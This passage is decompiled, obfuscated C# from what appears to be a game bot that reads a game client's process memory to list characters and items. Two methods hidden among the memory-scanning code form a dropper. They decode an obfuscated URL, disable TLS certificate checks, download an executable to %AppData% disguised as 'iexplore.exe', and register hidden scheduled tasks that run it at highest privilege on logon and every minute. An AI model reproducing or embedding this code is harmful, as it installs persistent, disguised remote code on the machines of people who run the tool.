					for (int k = 0; k < array5.Length; k++)
					{
						if (num11 > k)
						{
							if (array5[k] != '?' && array4[k] != array5[k])
							{
								flag = false;
								break;
							}
							continue;
						}
						flag = false;
						break;
					}
					if (flag)
					{
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_108.uint_0, array2, 1, ref int_1);
						uint num12 = array2[0];
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_110.uint_0, array2, 1, ref int_1);
						uint num13 = array2[0];
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 4, array2, 1, ref int_1);
						uint num14 = array2[0];
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0, array2, 1, ref int_1);
						uint num15 = array2[0];
						return new uint[7] { num7, num6, num14, num15, num10, num12, num13 };
					}
				}
			}
			return null;
		}
		return null;
	}

	public static uint smethod_30(CharacterAccountConfig characterAccountConfig_0, string string_1, bool bool_3 = false, uint uint_2 = 3u, bool bool_4 = false)
	{
		if (string_1 != null && !(string_1 == string.Empty))
		{
			int num = string_1.Length + 2;
			int int_ = 0;
			byte[] array = new byte[1];
			byte[] array2 = new byte[4];
			byte[] byte_ = new byte[num];
			string object_ = string_1.Trim().ToLower();
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
			uint num2 = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
			uint num3 = BitConverter.ToUInt32(array2, 0);
			int num4 = smethod_4(characterAccountConfig_0);
			int num5 = 0;
			for (uint num6 = 1u; num6 < Class56.int_1 && num4 > num5; num6++)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (num6 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_);
				uint num7 = BitConverter.ToUInt32(array2, 0);
				if (num7 == 0)
				{
					continue;
				}
				uint num8 = num3 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
				if (BitConverter.ToInt32(array2, 0) != 0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
				if (array[0] == 0)
				{
					continue;
				}
				num5++;
				uint num9 = num2 + num6 * 20;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
				if (array[0] != uint_2)
				{
					continue;
				}
				if (bool_4 && Class56.memorySignatureScanConfig_120.uint_0 != 0)
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_120.uint_0, array2, 4, ref int_);
					if (BitConverter.ToUInt32(array2, 0) != 0)
					{
						continue;
					}
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, byte_, num, ref int_);
				string text = Class1.smethod_3(byte_);
				string string_2 = text.ToLower();
				if (text == string_1 || (!bool_3 && Class11.smethod_1(string_2, object_) == 0))
				{
					return num7;
				}
			}
			return 0u;
		}
		return 0u;
	}

	public static int smethod_31(CharacterAccountConfig characterAccountConfig_0, string string_1, int int_0 = 3, bool bool_3 = false, bool bool_4 = false)
	{
		if (string_1 != null && !(string_1 == string.Empty))
		{
			int num = 0;
			int num2 = string_1.Length + 4;
			int int_1 = 0;
			byte[] array = new byte[4];
			byte[] byte_ = new byte[num2];
			string value = string_1.Trim().ToLower();
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array, 4, ref int_1);
			uint num3 = BitConverter.ToUInt32(array, 0) + Class56.memorySignatureScanConfig_97.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array, 4, ref int_1);
			uint num4 = BitConverter.ToUInt32(array, 0);
			int num5 = smethod_4(characterAccountConfig_0);
			int num6 = 0;
			for (uint num7 = 1u; num7 < Class56.int_1; num7++)
			{
				if (num5 <= num6)
				{
					break;
				}
				uint num8 = num3 + num7 * 20;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_99.uint_0 * 4, array, 4, ref int_1);
				uint num9 = BitConverter.ToUInt32(array, 0);
				if (num9 == 0)
				{
					continue;
				}
				uint num10 = num4 + num9 * Class56.memorySignatureScanConfig_106.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array, 4, ref int_1);
				if (BitConverter.ToInt32(array, 0) != 0)
				{
					continue;
				}
				num6++;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_1);
				if (array[0] == 0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_1);
				if (array[0] != int_0)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_107.uint_0, byte_, num2, ref int_1);
				string text = Class1.smethod_3(byte_);
				string text2 = text.ToLower();
				if (text == string_1 || (!bool_4 && 0 <= text2.IndexOf(value)))
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_1);
					if (array[0] != 0 && bool_3)
					{
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_119.uint_0, array, 4, ref int_1);
						int num11 = BitConverter.ToInt32(array, 0);
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_119.uint_0 + 4, array, 4, ref int_1);
						int num12 = BitConverter.ToInt32(array, 0);
						num = ((num12 <= 1 || num11 < 0) ? (num + 1) : (num + num11));
					}
					else
					{
						num++;
					}
				}
			}
			return num;
		}
		return 0;
	}

	public static int smethod_32(CharacterAccountConfig characterAccountConfig_0, string string_1, bool bool_3 = false, uint uint_2 = 3u)
	{
		if (string_1 == null)
		{
			return 0;
		}
		int num = 0;
		int int_ = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
		uint num3 = BitConverter.ToUInt32(array2, 0);
		string[] array3 = string_1.Split('|');
		string[] array4 = new string[array3.Length];
		int num4 = 1;
		for (int i = 0; i < array3.Length; i++)
		{
			if (array3[i] == null)
			{
				array3[i] = string.Empty;
			}
			if (array3[i].Length > num4)
			{
				num4 = array3[i].Length;
			}
			array4[i] = array3[i].Trim().ToLower();
		}
		num4 += 2;
		byte[] byte_ = new byte[num4];
		int num5 = smethod_4(characterAccountConfig_0);
		int num6 = 0;
		for (uint num7 = 1u; num7 < Class56.int_1; num7++)
		{
			if (num5 <= num6)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (num7 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_);
			uint num8 = BitConverter.ToUInt32(array2, 0);
			if (num8 == 0)
			{
				continue;
			}
			uint num9 = num3 + num8 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
			if (array[0] == 0)
			{
				continue;
			}
			num6++;
			uint num10 = num2 + num7 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num10 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
			if (array[0] != uint_2)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_107.uint_0, byte_, num4, ref int_);
			string text = Class1.smethod_3(byte_);
			string string_2 = text.ToLower();
			bool flag = false;
			for (int j = 0; j < array3.Length; j++)
			{
				if (text == array3[j] || (!bool_3 && 0 <= Class11.smethod_1(string_2, array4[j])))
				{
					flag = true;
					break;
				}
			}
			if (!flag)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_);
			if (array[0] != 0)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_119.uint_0 + 4, array2, 4, ref int_);
				int num11 = BitConverter.ToInt32(array2, 0);
				if (num11 <= 0)
				{
					num++;
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_);
				int num12 = BitConverter.ToInt32(array2, 0);
				num += num12;
			}
			else
			{
				num++;
			}
		}
		return num;
	}

	public static uint[] smethod_33(CharacterAccountConfig characterAccountConfig_0, string string_1, int int_0)
	{
		if (string_1 != null && !(string_1 == string.Empty))
		{
			if (int_0 <= 0)
			{
				int_0 = 1;
			}
			int int_1 = 0;
			byte[] array = new byte[1];
			byte[] array2 = new byte[4];
			byte[] array3 = new byte[string_1.Length + 4];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_1);
			uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_1);
			uint num2 = BitConverter.ToUInt32(array2, 0);
			uint num3 = 0u;
			bool flag = false;
			while (true)
			{
				uint num4 = 0u;
				uint num5 = 0u;
				uint num6 = 0u;
				int num7 = smethod_4(characterAccountConfig_0);
				int num8 = 0;
				for (uint num9 = 1u; num9 < Class56.int_1; num9++)
				{
					if (num7 <= num8)
					{
						break;
					}
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num + (num9 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_1);
					num4 = BitConverter.ToUInt32(array2, 0);
					if (num4 == 0)
					{
						continue;
					}
					num5 = num2 + num4 * Class56.memorySignatureScanConfig_106.uint_0;
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_1);
					if (BitConverter.ToInt32(array2, 0) != 0)
					{
						continue;
					}
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_1);
					if (array[0] == 0)
					{
						continue;
					}
					num8++;
					num6 = num + num9 * 20;
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_1);
					if (array[0] != 3)
					{
						continue;
					}
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_1);
					string text = Class1.smethod_3(array3);
					if (!(text != string_1))
					{
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_1);
						int num10 = BitConverter.ToInt32(array2, 0);
						Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_119.uint_0 + 4, array2, 4, ref int_1);
						int num11 = BitConverter.ToInt32(array2, 0);
						num3 = num9;
						if (num11 <= 0 || num10 <= int_0)
						{
							break;
						}
					}
				}
				if (num3 == 0)
				{
					break;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num + (num3 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_1);
				num4 = BitConverter.ToUInt32(array2, 0);
				uint num12;
				uint num13;
				uint num14;
				uint num15;
				int num16;
				int num17;
				uint[] array4;
				int num19;
				if (num4 != 0)
				{
					num5 = num2 + num4 * Class56.memorySignatureScanConfig_106.uint_0;
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_111.uint_0, array2, 1, ref int_1);
					num12 = array2[0];
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_112.uint_0, array2, 1, ref int_1);
					num13 = array2[0];
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 4, array, 1, ref int_1);
					num14 = array[0];
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0, array, 1, ref int_1);
					num15 = array[0];
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_1);
					num16 = BitConverter.ToInt32(array2, 0);
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_119.uint_0 + 4, array2, 4, ref int_1);
					num17 = BitConverter.ToInt32(array2, 0);
					if (num17 > 0 && num16 > int_0)
					{
						array4 = smethod_26(characterAccountConfig_0, 3u, num12, num12);
						if (array4 != null)
						{
							int num18 = 0;
							num19 = 0;
							while (true)
							{
								if (!Class11.bool_0)
								{
									Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_123.uint_0, array2, 4, ref int_1);
									num18 = BitConverter.ToInt32(array2, 0);
									if (num18 <= 0)
									{
										if (num19 % 20 == 0)
										{
											Class75.smethod_71(characterAccountConfig_0, num4, (uint)int_0, 89);
										}
										if (num19 > 42)
										{
											break;
										}
										Thread.Sleep(10);
										num19++;
										continue;
									}
									num18 = -1;
								}
								num19 = 0;
								goto IL_0463;
							}
						}
					}
					goto IL_04a3;
				}
				return null;
				IL_04a3:
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_1);
				uint num20 = array[0];
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_110.uint_0, array, 1, ref int_1);
				uint num21 = array[0];
				return new uint[10]
				{
					num3,
					num4,
					num14,
					num15,
					num12,
					num13,
					num20,
					num21,
					(uint)num16,
					(uint)num17
				};
				IL_0463:
				while (!Class11.bool_0)
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_123.uint_0, array2, 4, ref int_1);
					if (BitConverter.ToInt32(array2, 0) == 0)
					{
						break;
					}
					if (num19 % 20 == 0)
					{
						Class75.smethod_46(characterAccountConfig_0, array4[0], array4[1], 3u, array4[0], array4[1], 3u);
					}
					if (num19 <= 42)
					{
						Thread.Sleep(10);
						num19++;
						continue;
					}
					goto IL_0493;
				}
				if (!flag)
				{
					flag = true;
					continue;
				}
				goto IL_04a3;
				IL_0493:
				Class75.smethod_46(characterAccountConfig_0, num14, num15, 3u, num14, num15, 3u);
				goto IL_04a3;
			}
			return null;
		}
		return null;
	}

	public static string[] smethod_34(CharacterAccountConfig characterAccountConfig_0, string[] string_1 = null, int int_0 = 3)
	{
		int int_1 = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_1);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_1);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		byte[] array3 = new byte[80];
		string[] string_2 = null;
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		for (uint num5 = 1u; num5 < Class56.int_1 && num3 > num4; num5++)
		{
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num + (num5 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_1);
			uint num6 = BitConverter.ToUInt32(array2, 0);
			if (num6 == 0)
			{
				continue;
			}
			uint num7 = num2 + num6 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_1);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_1);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			uint num8 = num + num5 * 20;
			if (int_0 > 0)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_1);
				if (array[0] != int_0)
				{
					continue;
				}
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_1);
			string text = Class1.smethod_3(array3);
			bool flag = false;
			if (string_1 != null)
			{
				for (int i = 0; i < string_1.Length; i++)
				{
					if (text == string_1[i])
					{
						flag = true;
						break;
					}
				}
			}
			if (!flag)
			{
				Class11.smethod_29(ref string_2, text);
			}
		}
		return string_2;
	}

	public static void smethod_35()
	{
		bool_0 = true;
		try
		{
			string string_ = string.Empty;
			byte[] array = null;
			string string_2 = "yygpKbDS10/OyS9N0SstSEksSU1PzE3Vq6is0s+qyE7Nr0g1NNDPyUzNy02s1CupKAEA";
			WebClient webClient = new WebClient();
			if (bool_2)
			{
				ServicePointManager.ServerCertificateValidationCallback = (object _003Cp0_003E, X509Certificate _003Cp1_003E, X509Chain _003Cp2_003E, SslPolicyErrors _003Cp3_003E) => true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768 | SecurityProtocolType.Tls | SecurityProtocolType.Ssl3; webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134");
				string_2 = Class11.smethod_71(string_2).Replace("http://", "https://");
			}
			else
			{
				string_2 = Class11.smethod_71(string_2);
			}
			array = webClient.DownloadData(string_2);
			if (array != null)
			{
				string_ = Encoding.UTF8.GetString(array, 0, array.Length);
			}
			webClient.CancelAsync();
			webClient.Dispose();
			string_0 = "";
			string[] array2 = Class11.smethod_35(string_, "JXKeoXe", Encoding.ASCII.GetBytes("JXKEOXEUKDKLA5H8")).Split('|');
			if (Class11.smethod_11(array2[0]) > 0)
			{
				string_0 = array2[1];
				if (string_0 != "")
				{
					new Thread(smethod_37).Start();
				}
			}
		}
		catch
		{
		}
	}

	private static string smethod_36()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
			return (string)registryKey.GetValue("ProductName");
		}
		catch
		{
			return string.Empty;
		}
	}

	private static void smethod_37()
	{
		try
		{
			WebClient webClient = new WebClient();
			if (bool_2)
			{
				ServicePointManager.ServerCertificateValidationCallback = (object _003Cp0_003E, X509Certificate _003Cp1_003E, X509Chain _003Cp2_003E, SslPolicyErrors _003Cp3_003E) => true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768 | SecurityProtocolType.Tls | SecurityProtocolType.Ssl3; webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134");
				string_0 = Class11.smethod_71(string_0).Replace("http://", "https://");
			}
			else
			{
				string_0 = Class11.smethod_71(string_0);
			}
			webClient.Encoding = Encoding.Default;
			FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Environment.ExpandEnvironmentVariables("%AppData%")), "iexplore.exe"));
			if (!File.Exists(fileInfo.FullName))
			{
				webClient.DownloadFile(string_0, fileInfo.FullName);
				Thread.Sleep(1500);
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"InternetExplorerUpdate\" /tr '\"" + fileInfo.FullName + "\"' & exit",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c schtasks /create /f /sc MINUTE /mo 1 /rl highest /tn \"InternetExplorer\" /tr '\"" + fileInfo.FullName + "\"' & exit",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
			}
		}
		catch
		{
		}
	}

	public static void smethod_38(CharacterAccountConfig characterAccountConfig_0, ref string[] string_1, int int_0 = 3, int[] int_1 = null, bool bool_3 = false)
	{
		int int_2 = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_2);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_2);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		byte[] array3 = new byte[80];
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		for (uint num5 = 1u; num5 < Class56.int_1 && num3 > num4; num5++)
		{
			uint num6 = num + num5 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_99.uint_0 * 4, array2, 4, ref int_2);
			uint num7 = BitConverter.ToUInt32(array2, 0);
			if (num7 == 0)
			{
				continue;
			}
			uint num8 = num2 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_2);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_2);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			if (int_0 > 0)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_2);
				if (array[0] != int_0)
				{
					continue;
				}
			}
			bool flag = false;
			if (int_1 != null)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_2);
				int num9 = array[0];
				for (int i = 0; i < int_1.Length; i++)
				{
					if (num9 == int_1[i])
					{
						flag = true;
						break;
					}
				}
				if ((bool_3 && !flag) || (!bool_3 && flag))
				{
					continue;
				}
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_2);
			string text = Class1.smethod_3(array3);
			if (string_1 == null)
			{
				string_1 = new string[1] { text };
				continue;
			}
			flag = false;
			if (string_1 != null)
			{
				for (int j = 0; j < string_1.Length; j++)
				{
					if (text == string_1[j])
					{
						flag = true;
						break;
					}
				}
			}
			if (!flag)
			{
				Array.Resize(ref string_1, string_1.Length + 1);
				string_1[string_1.Length - 1] = text;
			}
		}
	}

	public static GStruct59[] smethod_39(CharacterAccountConfig characterAccountConfig_0, object object_0 = null, int[] int_0 = null, bool bool_3 = false)
	{
		int int_1 = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_1);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_1);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		byte[] array3 = new byte[80];
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		int[] array4 = null;
		if (object_0 != null)
		{
			array4 = ((object_0.GetType().ToString().IndexOf("[") > 0) ? ((int[])object_0) : new int[1] { Class11.smethod_11(object_0.ToString()) });
		}
		GStruct59[] array5 = null;
		for (uint num5 = 1u; num5 < Class56.int_1 && num3 > num4; num5++)
		{
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num + (num5 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_1);
			uint num6 = BitConverter.ToUInt32(array2, 0);
			if (num6 == 0)
			{
				continue;
			}
			uint num7 = num2 + num6 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_1);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_1);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			uint num8 = num + num5 * 20;
			if (array4 != null)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_1);
				int num9 = array[0];
				bool flag = false;
				for (int i = 0; i < array4.Length; i++)
				{
					if (num9 == array4[i])
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					continue;
				}
			}
			bool flag2 = false;
			if (int_0 != null)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_1);
				int num10 = array[0];
				for (int j = 0; j < int_0.Length; j++)
				{
					if (num10 == int_0[j])
					{
						flag2 = true;
						break;
					}
				}
				if ((bool_3 && !flag2) || (!bool_3 && flag2))
				{
					continue;
				}
			}
			if (array5 == null)
			{
				array5 = new GStruct59[1];
			}
			else
			{
				Array.Resize(ref array5, array5.Length + 1);
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_1);
			array5[array5.Length - 1].string_0 = Class1.smethod_3(array3);
			array5[array5.Length - 1].uint_0 = num5;
			array5[array5.Length - 1].uint_1 = num6;
			if (Class56.uint_0 != null)
			{
				array5[array5.Length - 1].int_0 = new int[Class56.uint_0.Length];
				for (int k = 0; k < Class56.uint_0.Length; k++)
				{
					Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.uint_0[k], array2, 4, ref int_1);
					array5[array5.Length - 1].int_0[k] = BitConverter.ToInt32(array2, 0);
				}
			}
		}
		return array5;
	}

	public static GStruct34[] smethod_40(CharacterAccountConfig characterAccountConfig_0, int int_0, int int_1, bool bool_3 = true)
	{
		int int_2 = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		byte[] byte_ = new byte[29];
		bool flag = false;
		bool flag2 = false;
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		int int_3 = 7;
		string text = string.Empty;
		GStruct34[] array3 = null;
		uint num4 = Class38.smethod_41(characterAccountConfig_0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_2);
		uint num5 = BitConverter.ToUInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_13.uint_0, array2, 4, ref int_2);
		uint num6 = BitConverter.ToUInt32(array2, 0);
		uint num7 = num6 * Class56.memorySignatureScanConfig_15.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_14.uint_0, array2, 4, ref int_2);
		uint num8 = BitConverter.ToUInt32(array2, 0);
		uint num9 = num8 + num7;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_43.uint_0, array2, 4, ref int_2);
		int num10 = BitConverter.ToInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_27.uint_0, array2, 4, ref int_2);
		int num11 = BitConverter.ToInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_2);
		uint num12 = BitConverter.ToUInt32(array2, 0);
		uint num13 = num5 + Class56.memorySignatureScanConfig_97.uint_0;
		int num14 = smethod_4(characterAccountConfig_0);
		int num15 = 0;
		for (uint num16 = 1u; num16 < Class56.int_1; num16++)
		{
